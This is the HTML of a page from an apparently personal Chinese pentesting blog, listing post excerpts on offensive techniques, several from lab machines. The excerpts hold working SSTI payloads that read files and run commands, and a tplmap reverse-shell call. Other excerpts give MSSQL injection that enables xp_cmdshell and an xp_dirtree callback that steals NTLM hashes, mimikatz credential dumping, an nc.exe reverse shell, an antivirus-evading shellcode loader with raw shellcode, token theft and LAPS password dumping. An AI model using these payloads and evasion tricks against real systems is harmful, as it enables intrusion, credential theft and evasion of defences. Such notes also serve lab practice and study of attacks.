<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Twe1ve&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
  <meta property="og:type" content="website">
<meta property="og:title" content="Twe1ve&#39;s Blog">
<meta property="og:url" content="https://github.com/page/2/index.html">
<meta property="og:site_name" content="Twe1ve&#39;s Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="icon" href="/images/icon.png">
  
  
<link rel="stylesheet" href="/css/index.css">



  <!-- 百度站長統計-->
  
  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?f4e4f3d9d2532faa71e451f2ab41cbb6";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>
  
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Twe1ve's Blog" type="application/atom+xml">
</head>

<div class="main height-100 flex flex-v">
  <div class="phone-header">
    <a to="/home" class="mobile-logo" > <img src="/images/logo.svg" /> </a>
    <a class="menu iconfont icon-menu" onclick="toggleMenu()"></a>
  </div>
  <div class="main-top flex flex1">
    <nuxt-link  to="/home" class="mobile-nav-btn iconfont icon-fenlei"></nuxt-link>
    <!--主页上左部分-->
    <div class="height-100 main-left  flex flex-v">
      <div class="main-left-top flex1">
        <a class="logo">
          <img src="/images/logo.svg" />
          <div class="sub-title">废物Twe1ve的垃圾展示台</div>
        </a>
        <nav class="nav">

  
    
      <a title="首页"  alt="首页"  v-for="(menu,index) in menus" href="/">
        <div class="icon"><i class="iconfont icon-home"></i></div>
        <div class="name">
          <div class="cnname">首页</div>
          <div class="enname">Home Page</div>
        </div>
      </a>

    
      <a title="归档"  alt="归档"  v-for="(menu,index) in menus" href="/archives">
        <div class="icon"><i class="iconfont icon-archives"></i></div>
        <div class="name">
          <div class="cnname">归档</div>
          <div class="enname">Archive Page</div>
        </div>
      </a>

    
      <a title="关于我"  alt="关于我"  v-for="(menu,index) in menus" href="./../about">
        <div class="icon"><i class="iconfont icon-about"></i></div>
        <div class="name">
          <div class="cnname">关于我</div>
          <div class="enname">About Me</div>
        </div>
      </a>

    
  

  <!--<a href="/link/">
    <div class="icon"><i class="iconfont icon-link"></i></div>
    <div class="name">
      <div class="cnname">友情链接</div>
      <div class="enname">Friends Web Link</div>
    </div>
  </a>-->
</nav>

      </div>

      <view class="website-msg">
        <div class="beian"><a target="_blank" href="http://www.miitbeian.gov.cn/"></a></div>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        <div class="beian"><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></div>
        <!--
        <div class="theme-drsc">PowerBy:<a href="https://hexo.io" target="_blank">Hexo</a> ThemeBy:<a href="" target="_blank">Soul</a></div>
        -->
        <div class="copyright">Copyright &#169 <a href="mailto:yorojogame@gmail.com">2020 Twe1ve&#39;s Blog</a> </div>
      </view>

      <div class="social flex flex-align-center ">
        
          
            
          
        
      </div>
    </div>
    <!--主页上右部分-->
    
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/" class="title">调用API绕过杀软添加用户</a>
    <section class="desc">
  创建隐藏账户：
net user tw$ password /add  ###用户名为tw，密码为password的
也可以通过修改注册表实现，需要system权限    如何发现隐藏账户：
通过组查看：
net localgroup administrators 
net localgroup users直接查看注册表，有什么用户一目了然HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\
一般情况下，添加用户的net会被拦截，下面介绍通过API调用的方式绕过
实现：
微软提供C++实现原型：
#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, &quot;netapi32.lib&quot;)

#include &lt;stdio.h&gt;
#include &lt;assert.h&gt;
#include &lt;windows.h&gt; 
#include &lt;lm.h&gt;

int wmain(int argc, wchar_t *argv[])
{
   LPGROUP_USERS_INFO_0 pBuf = NULL;
   DWORD dwLevel = 0;
   DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
   DWORD dwEntriesRead = 0;
   DWORD dwTotalEntries = 0;
   NET_API_STATUS nStatus;

   if (argc != 3)
   {
  fwprintf(stderr, L&quot;Usage: %s \\\\ServerName UserName\n&quot;, argv[0]);
  exit(1);
   }

   nStatus = NetUserGetGroups(argv[1],
  argv[2],
  dwLevel,
  (LPBYTE*)&amp;pBuf,
  dwPrefMaxLen,
  &amp;dwEntriesRead,
  &amp;dwTotalEntries);

   if (nStatus == NERR_Success)
   {
  LPGROUP_USERS_INFO_0 pTmpBuf;
  DWORD i;
  DWORD dwTotalCount = 0;

  if ((pTmpBuf = pBuf) != NULL)
  {
 fprintf(stderr, &quot;\nGlobal group(s):\n&quot;);

 for (i = 0; i &lt; dwEntriesRead; i++)
 {
assert(pTmpBuf != NULL);

if (pTmpBuf == NULL)
{
   fprintf(stderr, &quot;An access violation has occurred\n&quot;);
   break;
}

wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;grui0_name);

pTmpBuf++;
dwTotalCount++;
 }
  }

  if (dwEntriesRead &lt; dwTotalEntries)
 fprintf(stderr, &quot;\nTotal entries: %d&quot;, dwTotalEntries);

  printf(&quot;\nEntries enumerated: %d\n&quot;, dwTotalCount);
   }
   else
  fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);

   if (pBuf != NULL)
  NetApiBufferFree(pBuf);

   return 0;
}NetUserAdd添加普通用户，然后NetLocalGroupAddMembers添加到管理组
我用C实现效果如下：


</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="title">SSTI[服务器模板注入]</a>
    <section class="desc">
  漏洞成因：
用户输入未经过滤就交给引擎处理
将python语句编译成一句话： 
不同类型SSTI paylaod: 
SSTI模板注入常见引擎：

判断是哪种类型SSTI

一个实例：
nikto结果：+ Server: Werkzeug/0.14.1 Python/2.7.14 —&gt;有可能存在SSTI返回输入内容，已知

检测SSTI

name=49&amp;desc=yyyy   —&gt; Name: 7777777 desc: yyyy   —&gt; Jinja2（Twig将返回49）
确定是jinja之后，尝试文件读取和命令执行
读取文件
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
命令执行：
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
{{ config['RUNCMD']('ping -c 10.10.14.14 9999',shell=True) }}SSTI注入工具tplmap： 
python tplmap.py -u&apos;http://10.10.10.96:8080&apos; -X POST -d&apos;name=*desc=anything&apos; -c &apos;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU4NzczMTk1OX0.TTsnsWxpzkS32o7uluDl7n5Et4oTDcGiYAcfYPq2KjI&apos; --reverse-shell 10.10.14.14 9999

</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/MSSQL-NTLM-stealer/" class="title">MSSQL NTLM stealer</a>
    <section class="desc">
  可窃取NTLM的漏洞及利用方式
利用原理MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。
如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服务帐户将进行身份验证并提供NetNTLM哈希
环境说明：https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL SQLi，发现高权限账户但无法读取密码
漏洞利用
默认情况ASP/MSSQL支持堆叠注入：
常用的存储过程xp_cmdshell，它接收一个Windows命令，运行它并将结果以文本行的格式返回;验证是否可执行命令
https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC xp_cmdshell &apos;ping -c 4 10.10.14.14&apos;-- -本地监听icmp没有信息返回，即说明没有权限执行或没有开启xp_cmdshell,（xp_cmdhsell默认是禁用的，尝试开启）；尝试开启：
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure &apos;show advanced options&apos;, 1; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; reconfigure with override; exec master..xp_cmdshell &apos;ping -n 10 10.10.14.14&apos; -- -master.dbo.xp_shell  替代 xp_shell尝试绕过， Failed
猜测是没有权限的问题，想到xp_dirtree外带数据：
payload：
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.14\test%27;%20exec%20master.dbo.xp_dirtree%20@q%20--%20-


</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/" class="title">mimikatz抓取密码小记</a>
    <section class="desc">
  1、直接抓取本机：
[1]#privilege::debug          //提升权限[2]#sekurlsa::logonpasswords  //抓取密码
离线破解lsass.dmp
[1]dump lsass.dmp 回本地   //procudmp、dumpert、quarkspwdump等方法均可以dump下来
[2]#privilege::debug          //提升权限
[3]#sekurlsa::minidump C:\Users\Administrator\Downloads\mimikatz_trunk\x64\dumpert.dmp
[4]#sekurlsa::logonpasswords  //抓取密码
踩坑点：
[1]报错1：getting error ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)相对路径报错    
解决方法：lsass.dmp要给完整路径，
[2]报错2：ERROR kuhl_m_sekurlsa_acquireLSA ; Key importmimikatz版本过低
解决方法：使用2.0版本
[3]报错3：ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
windows 2012之后明文抓取均会出现这个报错
需要修改注册表开启 WDigest，等待管理员登陆后再次读取，没有做额外防护就可以直接拿到明文了
（mimikatz原理是读取内存中的密码，所以需要再次登录才能读取到）
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/" class="title">内网使用smb无文件执行</a>
    <section class="desc">
  创建smb共享
mkdir smb &amp;&amp; cd smb
cp  ~/winPEAS.exe  ~/smb   ####将需要的软件放到目录下
sudo impacket-smbserver share $(pwd) -smb2support -user Twe1ve -password  123456测试：
$pass = convertto-securestring &apos;123456&apos; -AsPlainText -Force
$cred= New-Object System.Management.Automation.PSCredential(&apos;Twe1ve&apos;,$pass)
New-PSDrive -name tw -PSProvider FileSystem -Credential $cred -Root \\10.10.14.61\share
执行：
Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; cd share:    ##进入共享磁盘

Evil-WinRM* PS share:\&gt; .\winPEAS.exe    ###执行

</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/shell%E4%B8%AD%E5%AE%9E%E7%8E%B0runas%E5%91%BD%E4%BB%A4/" class="title">shell中实现runas命令</a>
    <section class="desc">
  有时候收集到了账户凭据，但是psexec等方式不能远程执行命令的情况,大家第一个想到的就是runas命令了吧，但是我们都知道在shell中不能运行runas命令，下面给出在powershell中实现runas命令的效果
$pass = convertTo-SecureString &apos;36mEAhz/B8xQ~2VM&apos; -AsPlainText -Force                     
$cred= New-Object System.Management.Automation.PSCredential(&quot;Sniper\Chris&quot;,$pass)
Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred  ###验证是否是正确的凭证
Invoke-Command -Computer Sniper -ScriptBlock { dir } -Credential $cred
Invoke-Command -Computer Sniper -ScriptBlock { C:\ProgramData\nc.exe 10.10.15.64  6636 -e cmd.exe } -Credential $cred  ##反弹shell

</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/CSharp%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8powershell%E8%BF%87%E6%9D%80%E8%BD%AF/" class="title">C#底层调用powershell过杀软</a>
    <section class="desc">
  这里C#调用只是一个思路，还有很多方式调用powershell以逃避检测，达到免杀效果。免杀注重的还是思路，今天免杀的东西说不定明天就被杀了。
国内某数字杀软，会拦截powershell的运行，以前常用的复制powershell到当前目录执行也被拦截，或者修改empire中的特定函数同样被检测到,很多方式不再适用
从C#中调用
添加运行powershell需要的程序包：
C#调用powershell安装system.management.automation.dll：
管理NuGet程序包-&gt;浏览-&gt;搜索system.management.automation-&gt;选择system.management.automation.dll-&gt;重新生成项目即可
using System;
 using System.Configuration.Install;
 using System.Runtime.InteropServices;
 using System.Management.Automation.Runspaces;
 public class Program
 {
 public static void Main()
 {
 }
 }
 [System.ComponentModel.RunInstaller(true)]
 public class Sample : System.Configuration.Install.Installer
 {
 public override void Uninstall(System.Collections.IDictionary savedState)
 {
 Mycode.Exec();
 }
 }
 public class Mycode
 {
 public static void Exec()
 {
 string command = System.IO.File.ReadAllText(@&quot;C:\Users\fmc\Desktop\PowerUp.ps1&quot;);
 RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
 Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
 rspace.Open();
 Pipeline pipeline = rspace.CreatePipeline();
 pipeline.Commands.AddScript(command);
 pipeline.Invoke();
 }
 }PS1文件需要适当混淆以过静态查杀


</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/C%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E8%BF%87%E6%9D%80%E8%BD%AF/" class="title">C内存加载过杀软</a>
    <section class="desc">
  C的加载器有好几种，直接把shellcode放进源码中能够过静态层面的查杀，但是运行时会被查杀；
如最常用的加载器：
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)

unsigned char shellcode[] =
&quot;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&quot;
&quot;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&quot;
&quot;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&quot;
&quot;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&quot;
&quot;\x57\x78\x01\xc2\x8b\x7a\x20\x01&quot;
&quot;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&quot;
&quot;\x45\x81\x3e\x43\x72\x65\x61\x75&quot;
&quot;\xf2\x81\x7e\x08\x6f\x63\x65\x73&quot;
&quot;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&quot;
&quot;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&quot;
&quot;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&quot;
&quot;\xb1\xff\x53\xe2\xfd\x68\x63\x61&quot;
&quot;\x6c\x63\x89\xe2\x52\x52\x53\x53&quot;
&quot;\x53\x53\x53\x53\x52\x53\xff\xd7&quot;;
void main()
{
    ((void(*)(void))&amp;shellcode)();
}解决方法1：加密shellcode再解密运行（最后用一些比较偏的加密算法）
解决方法2：pyaload分离[1]借助main的入口参数，用户直接输shellcode
[2]从txt文件中加载shellcode
这个当初比较头疼，因为C语言这方面确实不大行，从txt读取shellcode的时候出现问题;记录如下：

获取txt中shellcode长度，申请内存空间


.使用fread读取txt为字符串，加载难以识别出shellcode    


.fscanf判定shellcode分割符需要进行转义(这点是乔哥解决的，我乔哥还是强啊)



</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/incognito-Stealing-Windows-Access-Tokens/" class="title">incognito Stealing Windows Access Tokens</a>
    <section class="desc">
  使用incognito可以窃取令牌以任意用户身份执行任意命令或payload
得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌列出域管理组成员：
net groups &quot;Domain Admins&quot; /domain0x01、ACCESS TOKEN(访问令牌)：
当用户登录时，Windows会为此用户创建访问令牌，用于存储用户的身份和特权
Token在用户创建进程或者线程时会被使用，那么这些进程或者线程能够访问哪些资源取决于当前令牌
0x02、令牌类型
Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)
Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)
这两种令牌,都会在系统重启以后被清除, 否则将会一直驻留在内存中,而授权令牌则会在用户注销以后自动被转为模拟令牌,但仍然可利用。
0x03、本地和远程的基本用法
本地： 
查看 token：
incognito.exe list_tokens–u 
获取到已注销用户 int18\administrator的token,盗取token 执行命令： 
incognito.exe execute -c &quot;int18\administrator&quot; calc.exe 远程：
incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  list_tokens -u
incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe 
0x04、提权、降权、伪造（以本地示例)
incognito execute -c &quot;NT AUTHORITYSYSTEM&quot; cmd.exe #提权至system 
incognito execute -c &quot;int\test&quot; cmd.exe #降权至当前 test 用户 
incognito execute -c &quot;int\test1&quot; cmd.exe #伪造test1 用户 0x03、获取TrustedInstaller 权限（修改系统文件）管理员、System 均无法修改系统文件、需 TrustedInstaller 权限借用 TrustedInstaller.exe 的 token 创建子进程，这样子进程就有了 TrustedInstaller 权限
在CS下获取TrustedInstaller 

shell sc strat TrustedInstaller 


steal token  1700 ##ps查看TrustedInstaller进程号


shell whoami /groups

链接：
https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/
https://blog.csdn.net/qq_36374896/article/details/84261516  
https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html 
https://www.jianshu.com/p/907c6aab6fd0
http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf


</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/" class="title">域渗透之AD Recyle Bin组利用+Ldaps信息枚举</a>
    <section class="desc">
  AD Recyle Bin组利用：使用回收站还原用户，或获取用户旧密码进行碰撞
前提,需要域内启用回收站功能，且用户在AD Recyle Bin 组中
未启用启用回收站和启用回收站删除对象对比
图1：启用回收站之前已删除的Active Directory对象的生命周期

图2：启用回收站后已删除的Active Directory对象的生命周期

启用AD回收站：
Enable-ADOptionalFeature –Identity ‘CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=www,DC=domain,DC=com’ –Scope ForestOrConfigurationSet –Target ‘www.domain.com’查看删除用户
Get-ADObject -filter &apos;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&apos; -includeDeletedObjects结果示例：
Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059尝试还原已删除账户
Restore-ADObject -Identity &apos;f0cc344d-31e0-4866-bceb-a842791ca059&apos;###使用ObjectGUID进行还原或
Get-ADObject -Filter {displayName -eq  &quot;TempAdmin&quot;} IncludeDeletedObjects | Restore-ADObject查询ms-mcs-admpwd
Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN=*)&quot; –IncludeDeletedObjects -Property ms-mcs-admpwd  查看有关于特定账户的全部属性信息：
Get-ADObject -Filter {displayName -eq &quot;TempAdmin&quot;} -IncludeDeletedObjects -Properties *  
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz如这里存在LegacyPassword（直接缓存的旧密码）名称被自定义，通过查看所有属性列出来
Ldap枚举：获取基本的账户信息、密码ldapsearch 使用：列出基本的上下文信息
kali@kali:$ ldapsearch -h 10.10.10.182 -D  cascade.local -x -s base namingcontexts提取整个域目录的数据，然后grep筛选输出：
kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -s sub -b &quot;DC=cascade,DC=local&quot; |tee ldap.out
root@kali:$ cat ldap.out |grep -i memberof筛选输出：
kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascade,DC=local&quot; &apos;(objectClass=User)&apos; sAMAccountName sAMAccountType列出管理用户组
kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascae,DC=local&quot; &apos;(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local)&apos; |grep -i memberofDump LAPS passwords:
kali@kali:$ ldapsearch -h  -D cascade.local -x -b &quot;dc=cascade,dc=local&quot; &apos;(ms-MCS-AdmPwd=*)&apos; ms-MCS-AdmPwd同样windapsearch也是一个不错的工具
kali@kali:$./windapsearch_py2.py  --dc-ip 10.10.10.182 -d cascade.local --full --users

...
user:r.thompson
cascadeLegacyPwd: clk0bjVldmE=
...https://github.com/snovvcrash/cheatsheets/tree/master 
https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html 


</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/">&lt;span class&#x3D;&quot;iconfont icon-arrow-left&quot;&gt;&lt;&#x2F;span&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">&lt;span class&#x3D;&quot;iconfont icon-arrow-right&quot;&gt;&lt;&#x2F;span&gt;</a>
  </nav>

-->

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.0.2/css/swiper.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.0.2/js/swiper.min.js"></script>
<div class="main-right flex1 flex flex-v">
    <div class="box-content flex1">
        <div class="swiper-container">
            <div class="swiper-wrapper">
                
                    <a title="调用API绕过杀软添加用户" alt="调用API绕过杀软添加用户" href="/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="调用API绕过杀软添加用户" alt="调用API绕过杀软添加用户"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 调用API绕过杀软添加用户 &gt;</div>
                            <div class="content flex1">
                                
  创建隐藏账户：
net user tw$ password /add  ###用户名为tw，密码为password的
也可以通过修改注册表实现，需要system权限    如何发现隐藏账户：
通过组查看：
net localgroup administrators 
net localgroup users直接查看注册表，有什么用户一目了然HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\
一般情况下，添加用户的net会被拦截，下面介绍通过API调用的方式绕过
实现：
微软提供C++实现原型：
#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, &quot;netapi32.lib&quot;)

#include &lt;stdio.h&gt;
#include &lt;assert.h&gt;
#include &lt;windows.h&gt; 
#include &lt;lm.h&gt;

int wmain(int argc, wchar_t *argv[])
{
   LPGROUP_USERS_INFO_0 pBuf = NULL;
   DWORD dwLevel = 0;
   DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
   DWORD dwEntriesRead = 0;
   DWORD dwTotalEntries = 0;
   NET_API_STATUS nStatus;

   if (argc != 3)
   {
  fwprintf(stderr, L&quot;Usage: %s \\\\ServerName UserName\n&quot;, argv[0]);
  exit(1);
   }

   nStatus = NetUserGetGroups(argv[1],
  argv[2],
  dwLevel,
  (LPBYTE*)&amp;pBuf,
  dwPrefMaxLen,
  &amp;dwEntriesRead,
  &amp;dwTotalEntries);

   if (nStatus == NERR_Success)
   {
  LPGROUP_USERS_INFO_0 pTmpBuf;
  DWORD i;
  DWORD dwTotalCount = 0;

  if ((pTmpBuf = pBuf) != NULL)
  {
 fprintf(stderr, &quot;\nGlobal group(s):\n&quot;);

 for (i = 0; i &lt; dwEntriesRead; i++)
 {
assert(pTmpBuf != NULL);

if (pTmpBuf == NULL)
{
   fprintf(stderr, &quot;An access violation has occurred\n&quot;);
   break;
}

wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;grui0_name);

pTmpBuf++;
dwTotalCount++;
 }
  }

  if (dwEntriesRead &lt; dwTotalEntries)
 fprintf(stderr, &quot;\nTotal entries: %d&quot;, dwTotalEntries);

  printf(&quot;\nEntries enumerated: %d\n&quot;, dwTotalCount);
   }
   else
  fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);

   if (pBuf != NULL)
  NetApiBufferFree(pBuf);

   return 0;
}NetUserAdd添加普通用户，然后NetLocalGroupAddMembers添加到管理组
我用C实现效果如下：



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="SSTI[服务器模板注入]" alt="SSTI[服务器模板注入]" href="/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="SSTI[服务器模板注入]" alt="SSTI[服务器模板注入]"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; SSTI[服务器模板注入] &gt;</div>
                            <div class="content flex1">
                                
  漏洞成因：
用户输入未经过滤就交给引擎处理
将python语句编译成一句话： 
不同类型SSTI paylaod: 
SSTI模板注入常见引擎：

判断是哪种类型SSTI

一个实例：
nikto结果：+ Server: Werkzeug/0.14.1 Python/2.7.14 —&gt;有可能存在SSTI返回输入内容，已知

检测SSTI

name=49&amp;desc=yyyy   —&gt; Name: 7777777 desc: yyyy   —&gt; Jinja2（Twig将返回49）
确定是jinja之后，尝试文件读取和命令执行
读取文件
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
命令执行：
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
{{ config['RUNCMD']('ping -c 10.10.14.14 9999',shell=True) }}SSTI注入工具tplmap： 
python tplmap.py -u&apos;http://10.10.10.96:8080&apos; -X POST -d&apos;name=*desc=anything&apos; -c &apos;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU4NzczMTk1OX0.TTsnsWxpzkS32o7uluDl7n5Et4oTDcGiYAcfYPq2KjI&apos; --reverse-shell 10.10.14.14 9999


                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="MSSQL NTLM stealer" alt="MSSQL NTLM stealer" href="/2020/04/26/MSSQL-NTLM-stealer/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="MSSQL NTLM stealer" alt="MSSQL NTLM stealer"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; MSSQL NTLM stealer &gt;</div>
                            <div class="content flex1">
                                
  可窃取NTLM的漏洞及利用方式
